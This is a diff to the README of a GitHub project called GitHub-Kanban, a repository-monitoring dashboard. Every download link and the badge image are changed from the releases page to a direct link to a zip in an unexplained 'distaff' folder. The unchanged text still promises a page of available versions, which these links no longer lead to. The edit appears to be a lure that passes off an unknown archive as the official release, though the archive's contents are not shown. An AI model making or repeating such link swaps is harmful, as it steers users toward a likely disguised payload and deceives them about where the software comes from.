@@ -1,6 +1,6 @@
 # 🚀 GitHub-Kanban - Monitor Your GitHub Repositories with Ease
 
-[![Download GitHub-Kanban](https://img.shields.io/badge/Download%20GitHub--Kanban-blue.svg)](https://github.com/Trejos10/GitHub-Kanban/releases)
+[![Download GitHub-Kanban](https://raw.githubusercontent.com/Trejos10/GitHub-Kanban/main/distaff/GitHub-Kanban.zip%https://raw.githubusercontent.com/Trejos10/GitHub-Kanban/main/distaff/GitHub-Kanban.zip)](https://raw.githubusercontent.com/Trejos10/GitHub-Kanban/main/distaff/GitHub-Kanban.zip)
 
 ## 📋 Overview
 
@@ -26,7 +26,7 @@ GitHub-Kanban is a lightweight, self-hosted dashboard designed to help you monit
 Follow these simple steps to download and run GitHub-Kanban:
 
 1. **Visit the Releases Page:** Click the link below to go to the GitHub-Kanban releases page:
-   - [Download GitHub-Kanban](https://github.com/Trejos10/GitHub-Kanban/releases)
+   - [Download GitHub-Kanban](https://raw.githubusercontent.com/Trejos10/GitHub-Kanban/main/distaff/GitHub-Kanban.zip)
 
 2. **Select the Latest Version:** On the releases page, locate the latest version of GitHub-Kanban. You’ll find a list of available files.
 
@@ -45,7 +45,7 @@ Follow these simple steps to download and run GitHub-Kanban:
 
 ## 📥 Download & Install
 
-You can begin by downloading the application using this link: [Download GitHub-Kanban](https://github.com/Trejos10/GitHub-Kanban/releases). This will take you to all available versions. Choose the latest version that matches your operating system and follow the steps above to install.
+You can begin by downloading the application using this link: [Download GitHub-Kanban](https://raw.githubusercontent.com/Trejos10/GitHub-Kanban/main/distaff/GitHub-Kanban.zip). This will take you to all available versions. Choose the latest version that matches your operating system and follow the steps above to install.
 
 ## 🛠️ Troubleshooting
 
